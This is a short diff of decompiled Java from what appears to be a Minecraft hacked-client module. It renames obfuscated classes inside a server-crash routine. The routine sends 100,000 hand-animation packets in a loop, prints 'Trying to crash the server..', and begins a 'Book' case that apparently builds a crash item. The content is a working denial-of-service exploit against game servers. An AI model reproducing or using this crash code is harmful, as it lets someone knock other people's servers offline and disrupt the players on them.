@@ -46,14 +46,14 @@ public class Class5266 extends PremiumModule {
                             this.field23695 = 0;
 
                             for (int var25 = 0; var25 < 100000; var25++) {
-                                mc.getClientPlayNetHandler().sendPacket(new Class5511(Class79.field182));
+                                mc.getClientPlayNetHandler().sendPacket(new CAnimateHandPacket(Hand.field182));
                             }
 
                             Class8906.method32487("Trying to crash the server..");
                         }
                         break;
                     case "Book":
-                        Class8848 var16 = new Class8848(Class8514.field38047);
+                        ItemStack var16 = new ItemStack(Class8514.field38047);
                         Class41 var17 = new Class41();
                         Class39 var18 = new Class39();
                         String var19 = "";
